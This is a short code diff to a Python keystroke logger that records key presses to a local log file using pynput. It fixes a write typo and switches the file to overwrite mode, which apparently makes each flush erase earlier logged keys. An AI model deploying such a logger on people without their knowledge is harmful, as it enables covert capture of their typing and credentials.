@@ -14,18 +14,16 @@ def on_press(key):
         keys = []
 
 def write_file():
-    with open('log.txt', 'a') as f:
+    with open('log.txt', 'w') as f:
         for key in keys:
             k = str(key).replace("'", "")
             if k.find("space") > 0:
                 f.write('\n')
             elif k.find("key") == -1:
-                f.wirte(k)
-
+                f.write(k)
 
 def on_release(key):
     if key == Key.esc:
-        
         return False
 
 with Listener(on_press=on_press, on_release=on_release) as  listener:
